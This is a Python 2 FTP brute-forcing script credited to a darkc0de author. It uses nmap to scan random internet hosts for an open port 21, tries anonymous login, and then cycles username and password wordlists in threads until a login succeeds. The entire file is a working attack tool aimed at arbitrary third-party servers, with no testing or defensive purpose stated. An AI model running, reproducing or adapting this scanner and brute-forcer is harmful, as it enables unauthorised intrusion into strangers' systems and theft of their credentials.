#!usr/bin/python
#Uses nmap to check if ftp port is open, brute forces if it is.
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, StringIO, commands, random, sys, ftplib, re
from ftplib import FTP
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./ftpbrute.py <how many to scan> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com ftpBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Scanning:",sys.argv[1],"hosts"
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"

wordlist = copy(words)

def scan():
	
	nmap = StringIO.StringIO(commands.getstatusoutput('nmap -P0 -iR 1 -p 21 | grep open -B 3')[1]).readlines()
	
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:    		
			return ipaddr

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "Reloading Wordlist\n"
		reloader()
		value = random.sample(words,  1)
		
	lock.release()
	return value[0][:-1]
		
class Workhorse(threading.Thread):
	
	def run(self):
		value = getword()
		try:
			print "-"*12
			print "User:",user[:-1],"Password:",value
			ftp = FTP(ipaddr[0])
			ftp.login(user[:-1], value)
			ftp.retrlines('LIST')
			print "\t\nLogin successful:",user, value
			ftp.quit()
			work.join()
			sys.exit(2)
		except (ftplib.all_errors), msg: 
			print "An error occurred:", msg
			pass

for x in range(int(sys.argv[1])):
	print "Scanning:",x,"of",sys.argv[1]
	ipaddr = scan()
	if ipaddr != None:
		print "\n\tAttempting BruteForce:",ipaddr[0],"\n"
		try:
			f = FTP(ipaddr[0])
			print "[+] Response:",f.getwelcome()
		except (ftplib.all_errors):
			pass
		try:
			print "\n[+] Checking for anonymous login:",ipaddr[0],"\n"
			ftp = FTP(ipaddr[0])
			ftp.login()
			ftp.retrlines('LIST')
			print "\t\nAnonymous login successful!!!\n"
			ftp.quit()
		except (ftplib.all_errors): 
			print "\tAnonymous login unsuccessful\n"
		for user in users:
			for i in range(len(words)):
				if i == 0: reloader()
				work = Workhorse()
				work.start()
				time.sleep(2)

